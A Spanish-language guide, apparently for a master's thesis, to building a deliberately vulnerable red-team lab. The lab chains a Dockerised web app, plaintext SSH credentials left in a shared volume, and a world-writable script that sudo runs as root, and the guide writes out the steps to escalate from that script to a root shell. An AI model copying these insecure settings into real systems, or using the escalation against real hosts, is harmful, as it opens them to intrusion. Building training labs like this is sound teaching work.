# Estructura mejorada del laboratorio Red Team

```
Kali VM
  │
  │ ataque web
  ▼
Ubuntu VM víctima - 192.168.66.10
  │
  ├── Docker: web vulnerable
  │      └── Apache/PHP vulnerable
  │
  └── Sistema Ubuntu real
         ├── usuarios locales
         ├── servicios internos
         ├── ficheros sensibles simulados
         └── posible escalada controlada
```

Actualmente la web apache esta en /var/www/html/portal_pyme. Quiero que el flujo sea el siguiente:

1. Kali ataca la web vulnerable en Docker
2. Se consigue ejecución/control limitado dentro del contenedor
3. Desde el contenedor se enumera el entorno
4. Se detecta una mala configuración
5. Se escapa o se accede parcialmente a la VM Ubuntu
6. En Ubuntu se escala privilegios de forma controlada


### docker-compose
```yaml
services:
  web:
    build: ./docker/web
    container_name: tfm_web
    ports:
      - "8080:80"
    volumes:
      - ./app:/var/www/html
      - ./shared:/shared
    depends_on:
      - db
    networks:
      - tfm_lab

  db:
    image: mysql:8.0
    container_name: tfm_db
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: portal_pyme
      MYSQL_USER: portal
      MYSQL_PASSWORD: portal123
    volumes:
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - tfm_lab

networks:
  tfm_lab:
    driver: bridge
```

ya tenemos una web vulnerable donde el atacante puede acceder al servidor como `www-data`. Ahora queremos hacer el movimiento desde Docker hacia Ubuntu de esta forma:
```
Contenedor web
   ↓
Encuentra credenciales de usuario dev
   ↓
SSH a Ubuntu víctima
   ↓
Usuario dev en la VM
```

## 👤 1. Usuarios 

En tu Ubuntu VM (host) define esto:

### 🔹 Usuario 1: dev (usuario comprometido)

Características:

- Usuario (desarrollador)
- Tiene acceso SSH
- Tiene permisos limitados
- Es el pivot del ataque

👉 Este es el usuario que el atacante obtiene desde Docker

Usuario dev puede ejecutar como root un script de mantenimiento.
El script está mal protegido.
El atacante modifica el flujo o abusa de esa configuración.


### 🔹 Usuario 2: www-data (contenedor)

Este ya existe en Apache/PHP.


### 🔹 Usuario 3: root
No accesible directamente
Solo mediante escalada

## 🔐 2. Movimiento lateral: Docker → Ubuntu

```
www-data (contenedor)
   ↓
encuentra credenciales
   ↓
ssh dev@192.168.66.10
```



### 🔥 OPCIÓN RECOMENDADA (limpia para TFM)

Usa el volumen que ya tienes:

```
- ./shared:/shared
```

### 📁 En el host Ubuntu crea:
```bash
mkdir /opt/tfm/shared
```

Dentro:
```bash
nano /opt/tfm/shared/dev_credentials.txt
```

Contenido:
```
Usuario: dev
Password: dev123
Nota: acceso SSH habilitado en servidor interno
```


## 📌 Montaje en Docker

El compose ya lo tiene:

```
- ./shared:/shared
```

## 👉 Desde el contenedor:
```
cat /shared/dev_credentials.txt
```
---

## 🔐 Configuración SSH en Ubuntu

Asegúrate:
```bash
sudo apt install openssh-server
```

Editar:
```bash
sudo nano /etc/ssh/sshd_config
```

Asegura:
```
PasswordAuthentication yes
PermitRootLogin no
```

Reiniciar:
```bash
sudo systemctl restart ssh
```

---

## 🔁 Flujo real

Desde Kali:
```
ssh dev@192.168.66.10
```

---

## 🧠 3. Escalada de privilegios (parte más importante)

🎯 Objetivo
```
dev → root
```

## 🔥 OPCIÓN IDEAL (script vulnerable con sudo)

### 1. Crear script de mantenimiento
```bash
sudo mkdir /opt/scripts
sudo nano /opt/scripts/backup.sh
``` 

Contenido:
```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /var/www/html
```

### 2. Permisos MAL configurados (intencionado)
```bash
sudo chmod 777 /opt/scripts/backup.sh
```

👉 🔥 Esto es la vulnerabilidad


### 3. Configurar sudo

Editar:
```bash
sudo visudo
```

Añadir:
```bash
dev ALL=(ALL) NOPASSWD: /opt/scripts/backup.sh
```


## 🧨 Qué puede hacer el atacante

Como dev:
```bash
nano /opt/scripts/backup.sh
```

Modificar a:
```bash
#!/bin/bash
/bin/bash
```

Ejecutar:
```bash
sudo /opt/scripts/backup.sh
```

👉 💥 shell como root


## 🧩 4. Alternativa más elegante (por si quieres subir nivel)

En vez de 777, puedes hacer:
```bash
chown root:dev backup.sh
chmod 775 backup.sh
```

👉 sigue siendo vulnerable pero más “realista”



## 🧪 5. Cómo lo documentas en el TFM

Esto es CLAVE.

📌 Escenario 2 (lateral movement)

>Se detecta la existencia de un volumen compartido entre el contenedor y el sistema host, en el que se almacenan credenciales en texto plano. El atacante utiliza estas credenciales para autenticarse vía SSH en el sistema Ubuntu.

📌 Escenario 3 (privilege escalation)

>El usuario comprometido dispone de permisos para ejecutar un script de mantenimiento con privilegios elevados mediante sudo. Sin embargo, el script presenta permisos de escritura inseguros, permitiendo su modificación y la ejecución arbitraria de comandos como root.

## 🧠 6. Resultado final (muy importante)

Tu laboratorio ahora tiene:


✔ Acceso inicial
- vulnerabilidad web

✔ Ejecución
- shell en contenedor

✔ Credential access
- credenciales en volumen

✔ Lateral movement
- SSH a Ubuntu

✔ Privilege escalation
- abuso de sudo + script

---

# Niveles obtenidos

Asi tenemos 3 niveles de dificultad:

- **Nivel 1**: Web vulnerable → acceso al contenedor
- **Nivel 2**: Contenedor → credenciales → acceso Ubuntu
- **Nivel 3**: Ubuntu usuario limitado → root por mala configuración

```bash
Initial Access → Discovery → Credential Access → Lateral Movement → Privilege Escalation
```
